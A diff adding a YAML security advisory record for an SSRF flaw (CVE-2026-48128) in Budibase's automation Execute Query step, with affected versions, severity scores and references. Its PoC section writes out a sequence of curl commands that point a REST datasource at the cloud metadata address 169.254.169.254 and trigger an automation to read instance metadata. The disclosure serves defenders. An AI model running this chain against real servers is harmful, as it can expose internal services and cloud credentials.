@@ -1,0 +1,165 @@
+advisory_id: GHSA-6964-pp88-6wp9
+datasource_id: github_osv/GHSA-6964-pp88-6wp9
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-6964-pp88-6wp9/GHSA-6964-pp88-6wp9.json
+aliases:
+  - CVE-2026-48128
+summary: |
+  Budibase: SSRF via User-Controlled queryId in Automation Execute Query Step
+  ### Summary
+
+  The executeQuery automation step in Budibase accepts a queryId from automation step inputs and passes it directly to the query execution controller without additional validation. When combined with a REST datasource configured to target internal infrastructure, this creates a server-side request forgery path where automation execution causes the Budibase server to make outbound HTTP requests to attacker-influenced destinations. The automation output then returns the response, potentially exposing internal service data.
+
+  ### Details
+
+  Inside the execute query automation step, the queryId value and any additional query parameters from `inputs.query` are assembled into a request context and forwarded to `queryController.executeV2AsAutomation`. The constructed context looks like the following:
+
+  ```typescript
+  const ctx: any = buildCtx(appId, emitter, {
+    body: {
+      parameters: rest,
+    },
+    params: {
+      queryId,
+    },
+    user: context.user,
+  })
+  ```
+
+  No validation is performed to confirm that the referenced query is appropriate for automation use, that the associated datasource targets an allowlisted destination, or that the supplied parameters do not override security-sensitive fields. The `context.user` value is also forwarded directly from automation context into the request, which may allow caller identity to be influenced by automation binding inputs.
+
+  To reach exploitation, an attacker needs builder-level access to the Budibase application. With that access, they can create a REST datasource with a base URL pointing to an internal network endpoint such as a cloud metadata service, create a query against that datasource, and then create an automation whose Execute Query step references that query. When the automation is triggered, the Budibase server issues the HTTP request originating from its own network context, and the response is captured in the automation output.
+
+  The key limitation, reflected in the revised severity, is that builder access already permits direct datasource configuration. A builder can configure a REST datasource and test it directly without involving the automation layer at all. The automation execute query path therefore does not provide a meaningful privilege escalation beyond what a builder role already permits. The finding is technically valid as an SSRF condition but the preconditions required to exploit it are equivalent to the preconditions for directly interacting with datasources.
+
+  ### PoC
+
+  ```bash
+  curl -s -X POST "$BUDIBASE_HOST/api/datasources" \
+    -H "Cookie: $SESSION_COOKIE" \
+    -H "Content-Type: application/json" \
+    -d '{
+      "datasource": {
+        "name": "internal-meta",
+        "type": "REST",
+        "source": "REST",
+        "config": {
+          "url": "http://169.254.169.254",
+          "rejectUnauthorized": false,
+          "defaultHeaders": {}
+        }
+      }
+    }'
+
+  curl -s -X POST "$BUDIBASE_HOST/api/queries" \
+    -H "Cookie: $SESSION_COOKIE" \
+    -H "Content-Type: application/json" \
+    -d "{
+      \"datasourceId\": \"$DATASOURCE_ID\",
+      \"name\": \"meta-probe\",
+      \"queryVerb\": \"read\",
+      \"fields\": {
+        \"path\": \"/latest/meta-data/\",
+        \"queryString\": \"\",
+        \"headers\": {},
+        \"requestBody\": \"\"
+      },
+      \"parameters\": [],
+      \"transformer\": \"return data\",
+      \"schema\": {}
+    }"
+
+  curl -s -X POST "$BUDIBASE_HOST/api/automations" \
+    -H "Cookie: $SESSION_COOKIE" \
+    -H "Content-Type: application/json" \
+    -d "{
+      \"name\": \"ssrf-test\",
+      \"definition\": {
+        \"trigger\": {
+          \"event\": \"app:trigger\",
+          \"stepId\": \"APP\",
+          \"inputs\": {},
+          \"schema\": {\"inputs\": {\"properties\": {}, \"required\": []}},
+          \"type\": \"TRIGGER\",
+          \"id\": \"trigger1\"
+        },
+        \"steps\": [
+          {
+            \"stepId\": \"EXECUTE_QUERY\",
+            \"inputs\": {
+              \"query\": {
+                \"queryId\": \"$QUERY_ID\"
+              }
+            },
+            \"schema\": {},
+            \"type\": \"ACTION\",
+            \"id\": \"step1\"
+          }
+        ]
+      }
+    }"
+
+  curl -s -X POST "$BUDIBASE_HOST/api/automations/$AUTOMATION_ID/trigger" \
+    -H "Cookie: $SESSION_COOKIE" \
+    -H "Content-Type: application/json" \
+    -d '{}'
+  ```
+
+  ### Impact
+
+  An authenticated user with builder-level access to a Budibase application can cause the Budibase server to issue HTTP requests to internal network endpoints, including cloud instance metadata services, by configuring a REST datasource targeting those endpoints and referencing the resulting query from an automation Execute Query step. Response content from the internal service is returned in the automation run output. Because builder access already permits direct datasource configuration and testing, this path does not represent a meaningful escalation of privilege beyond the builder role. The practical impact is limited to environments where builder access is granted to partially trusted users and where network-level controls do not restrict outbound HTTP from the Budibase server process.
+impacted_packages:
+  - purl: pkg:npm/budibase
+    affected_versions: vers:npm/<3.39.0
+    fixed_versions: vers:npm/3.39.0
+    affected_packages:
+      - pkg:npm/budibase@0.0.3
+      - pkg:npm/budibase@0.0.7
+      - pkg:npm/budibase@0.0.8
+      - pkg:npm/budibase@0.0.9
+      - pkg:npm/budibase@0.0.10
+      - pkg:npm/budibase@0.0.11
+      - pkg:npm/budibase@0.0.12
+      - pkg:npm/budibase@0.0.13
+      - pkg:npm/budibase@0.0.14
+      - pkg:npm/budibase@0.0.15
+      - pkg:npm/budibase@0.0.17
+      - pkg:npm/budibase@0.0.18
+      - pkg:npm/budibase@0.0.19
+      - pkg:npm/budibase@0.0.20
+      - pkg:npm/budibase@0.0.21
+      - pkg:npm/budibase@0.0.22
+      - pkg:npm/budibase@0.0.23
+      - pkg:npm/budibase@0.0.24
+      - pkg:npm/budibase@0.0.27
+      - pkg:npm/budibase@0.0.28
+      - pkg:npm/budibase@0.0.29
+      - pkg:npm/budibase@0.0.30
+      - pkg:npm/budibase@0.0.31
+    fixed_packages:
+      - pkg:npm/budibase@3.39.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '5.1'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-6964-pp88-6wp9/GHSA-6964-pp88-6wp9.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-918
+references:
+  - url: https://github.com/Budibase/budibase
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-48128
+    reference_type:
+    reference_id:
+  - url: https://github.com/Budibase/budibase/security/advisories/GHSA-6964-pp88-6wp9
+    reference_type: other
+    reference_id: GHSA-6964-pp88-6wp9
+exploits: []
